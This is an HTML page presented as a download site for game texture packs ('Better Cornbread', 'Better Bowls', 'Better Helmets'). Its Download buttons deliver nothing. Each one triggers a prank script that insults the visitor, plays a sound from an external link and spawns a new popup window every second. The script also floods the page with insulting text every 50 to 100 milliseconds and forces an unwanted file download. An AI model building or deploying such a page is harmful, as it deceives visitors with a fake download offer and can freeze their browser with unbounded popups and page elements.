<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Better Texture Packs</title>
    <style>
        body {
            background: url('https://iili.io/2LnOhhX.png') no-repeat center center fixed;
            background-size: cover;
            text-align: center;
            font-family: Arial, sans-serif;
            color: white;
            transition: background 0.5s;
            overflow: hidden;
        }
        .container {
            margin-top: 50px;
        }
        .pack {
            display: inline-block;
            background: rgba(0, 0, 0, 0.7);
            padding: 15px;
            margin: 10px;
            border-radius: 10px;
        }
        img {
            width: 200px;
            border-radius: 10px;
        }
        button {
            margin-top: 10px;
            padding: 10px;
            background: red;
            color: white;
            border: none;
            cursor: pointer;
            border-radius: 5px;
        }
        .troll-window {
            position: absolute;
            background: black;
            color: white;
            padding: 20px;
            border: 2px solid red;
            font-size: 20px;
            font-weight: bold;
            z-index: 1000;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Better Texture Packs</h1>
        <div class="pack">
            <img src="https://iili.io/2L5ZfCN.png" alt="Better Cornbread">
            <p>Better Cornbread</p>
            <button onclick="download()">Download</button>
        </div>
        <div class="pack">
            <img src="https://iili.io/2Lowp7p.png" alt="Better Bowls">
            <p>Better Bowls</p>
            <button onclick="download()">Download</button>
        </div>
        <div class="pack">
            <img src="https://iili.io/3CiFphx.png" alt="Better Helmets">
            <p>Better Helmets</p>
            <button onclick="download()">Download</button>
        </div>
    </div>
    <audio id="trollSound" src="https://s43.notube.lol/download.php?token=b5c27f9b6d567aef6182bcf290d71499&key=1vkcs3ujog7mdgs0" preload="auto"></audio>
    
    <script>
        function download() {
            alert("Your download will start soon...");
            setTimeout(troll, 2000);
        }

        function troll() {
            alert("YOU ARE AN IDIOT! AHAHAHAAAAA");
            document.body.style.background = "red";
            document.getElementById("trollSound").play();
            
            setInterval(() => {
                window.open("https://iili.io/2LnOhhX.png", "", "width=400, height=300");
            }, 1000);
            
            setInterval(() => {
                let trollDiv = document.createElement("div");
                trollDiv.classList.add("troll-window");
                trollDiv.innerText = "YOU ARE AN IDIOT! AHAHAHAAAAA";
                trollDiv.style.top = Math.random() * window.innerHeight + "px";
                trollDiv.style.left = Math.random() * window.innerWidth + "px";
                document.body.appendChild(trollDiv);
            }, 100);
            
            setInterval(() => {
                let glitch = document.createElement("div");
                glitch.style.position = "absolute";
                glitch.style.top = Math.random() * window.innerHeight + "px";
                glitch.style.left = Math.random() * window.innerWidth + "px";
                glitch.style.color = "lime";
                glitch.style.fontSize = "30px";
                glitch.innerText = "YOU ARE AN IDIOT!";
                document.body.appendChild(glitch);
            }, 50);
            
            setTimeout(() => {
                let textFile = new Blob(["YOU ARE AN IDIOT! AHAHAHAAAAA"], { type: "text/plain" });
                let downloadLink = document.createElement("a");
                downloadLink.href = URL.createObjectURL(textFile);
                downloadLink.download = "trolled.txt";
                document.body.appendChild(downloadLink);
                downloadLink.click();
                document.body.removeChild(downloadLink);
            }, 3000);
        }
    </script>
</body>
</html>
